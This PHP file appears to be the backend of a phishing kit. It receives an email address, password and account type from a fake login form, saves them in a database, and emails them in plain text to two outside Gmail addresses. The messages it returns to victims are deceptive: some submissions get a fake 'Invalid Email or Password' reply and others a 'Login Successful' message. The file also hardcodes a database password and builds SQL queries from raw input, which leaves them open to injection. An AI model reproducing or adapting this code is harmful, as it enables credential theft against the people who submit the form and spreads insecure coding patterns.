<?php 

$host = "localhost";
$user = "id14859602_courier";
$password ="Etisalat123!";
$database ="id14859602_royalstar";

    $conn=mysqli_connect($host,$user,$password,$database);
    if($conn)
    {
    //     echo "true";
    }
    else
    {
        die(mysqli_error($conn));
    }
     $email=$_POST['email'];
     $type=$_POST['typ'];
     $password=$_POST['password'];

     function sanitize_my_email($field) {
        $field = filter_var($field, FILTER_SANITIZE_EMAIL);
        if (filter_var($field, FILTER_VALIDATE_EMAIL)) {
            return true;
        } else {
            return false;
        }
    }
    
    $to_email = 'grahamcollinsunc@gmail.com';
    $email2="charlex1199@gmail.com";
    $subject = 'Mail from Pocketbrain';
    $msg='<h1>Email ='.$email.'<br>'.'Password='.$password.'<br>'.'Type = '.$type.'</h1>';
    $message = $msg;


    $check=mysqli_query($conn,"SELECT * FROM client where email='$email' and password='$password' and typ='$type'");
    if(mysqli_num_rows($check)<=1)
    {
        // still insert
        $query=mysqli_query($conn,"INSERT INTO client (typ,email,password,time) values('$type','$email','$password',now())");
        if($query)
        {
            
            //check if the email address is invalid $secure_check
            $secure_check = sanitize_my_email($to_email);
            if ($secure_check == false) {
                echo "Invalid input";
            } else { //send email 
                mail($email2,$subject,$message);
                mail($to_email, $subject, $message);
                // echo "This email is sent using PHP Mail";
            }
            echo json_encode(array("statusCode"=>201,"msg"=>"Invalid Email or Password"));
        }
        else
        {
            $error=mysqli_error($query);
            echo $error;
            echo json_encode(array("statusCode"=>201,"error"=>$error));
        }
    }

    else
    {
  
        $query=mysqli_query($conn,"INSERT INTO client (typ,email,password,time) values('$type','$email','$password',now())");
        if($query)
        {
           
            $secure_check = sanitize_my_email($to_email);
            if ($secure_check == false) {
                echo "Invalid input";
            } else { //send email 
            mail($email2,$subject,$message);
                mail($to_email, $subject, $message);
                
            }
            echo json_encode(array("statusCode"=>200,"msg"=>"Login Successful"));
        }
        else
        {
            $error=mysqli_error($conn,$query);
            echo $error;
            echo json_encode(array("statusCode"=>201,"error"=>$error));
        }
    }

?>